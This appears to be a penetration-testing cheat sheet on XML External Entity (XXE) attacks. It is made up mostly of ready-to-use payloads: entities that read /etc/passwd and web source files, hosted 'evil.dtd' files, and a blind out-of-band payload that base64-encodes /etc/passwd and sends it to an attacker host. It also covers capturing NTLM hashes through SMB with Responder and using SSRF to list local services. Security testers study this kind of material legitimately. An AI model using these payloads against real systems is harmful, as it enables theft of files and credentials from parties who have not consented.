---
description: XML External Entity
---

# XXE

> An _XML External Entity_ attack is a type of attack against an application that parses XML input. This attack occurs when **XML input containing a reference to an external entity is processed by a weakly configured XML parser.**&#x20;

### Read system files

```xml
<?xml version="1.0"?> 
<!DOCTYPE data [ 
<!ENTITY file SYSTEM "file:///etc/passwd"> 
]>

<data>&file;</data> 
```

**Note:** Files that contains special chars (<>!\[]) might not be outputted and the parser might return errors. Try using an external DTD (next example).

### Read system files using external DTDs

Useful to retrieve files that contains special characters. Perform the following steps:&#x20;

```bash
#1. Host a dtd file (e.g. evil.dtd) with the following structure: 

<!ENTITY % start "<![CDATA["> 
<!ENTITY % file SYSTEM "/var/www/index.php">   
<!ENTITY % end "]]>"> 
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>"> 

# 2. Call our hosted DTD (evil.dtd) and invoke the entities: 

<?xml version="1.0" encoding="ISO-8859-1"?> 
<!DOCTYPE data [ 
    <!ENTITY % dtd SYSTEM "http://OurServer/evil.dtd"> 
    %dtd; 
    %all; 
]> 

<data>&fileContents;</data> 
```

### Out of Band via HTTP (Blind)

Perform the following steps:

{% code overflow="wrap" %}
```bash
#1. Host a malicious DTD like:

<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=file:///etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://x.x.x.x:8811/dtd.xml?%data;'>">

#or this one

<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=file:///etc/passwd">
<!ENTITY % param1 "<!ENTITY &#25; exfil SYSTEM 'http://x.x.x.x:8811/dtd.xml?%data;'>">

#2. Call our hosted DTD and invoke the entities: 

<?xml version="1.0"?> 
<!DOCTYPE r [ 
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://x.x.x.x:8811/dtd.xml">
%sp;
%param1; 
]> 

<data>&exfil;</data>
```
{% endcode %}

### XXE to NTLM hashes (using Responder)

We know that an XXE be used to read local files. Aside from that, we can call a remote server (through SMB) to obtain NTLMv2 hashes:

#### 1. Start responder

```bash
./Responder.py -I <interface> -v
```

#### 2. Call the SMB server through the XXE

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE root [<!ENTITY file SYSTEM 'file://///X.X.X.X/file.txt'>]>
<root>&file;</root>
```

**Note:** Sometimes, using the "file" protocol, you can not connect to the SMB share. It is dependent on various factors. Try "//ip", "\ip", "////ip", "\\\ip". Also, PHP wrappers also might be useful.

#### 3. Crack obtained hashes using john or hashcat

### SSRF using external DTDs

Perform the following steps:

{% code overflow="wrap" %}
```bash
#1. Enumerate local services: 

<?xml version="1.0"?> 
<!DOCTYPE data [ 
<!ENTITY file SYSTEM "file:///proc/net/tcp"> 
]> 

<data>&file;</data> 

#2. Convert the first column from HEX to Decimal (python3) and extract "ip:port": 

import socket 
import struct 
hex_ip = input("Enter IP (in hex): ") 
addr_long = int(hex_ip, 16) 
print("IP in dotted-decimal notation:", socket.inet_ntoa(struct.pack("<L", addr_long))) 

#3. Host a dtd file (e.g. evil.dtd) with the following structure: 

<!ENTITY % start "<![CDATA["> 
<!ENTITY % file SYSTEM "http://localgost:x/x.php"> #File to retrieve 
<!ENTITY % end "]]>"> 
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>"> 

#4. Call our hosted DTD (evil.dtd) and invoke the entities: 

<?xml version="1.0" encoding="ISO-8859-1"?> 
<!DOCTYPE data [ 
    <!ENTITY % dtd SYSTEM "http://OurServer/evil.dtd"> 
    %dtd; 
    %all; 
]> 

<data>&fileContents;</data> 
```
{% endcode %}
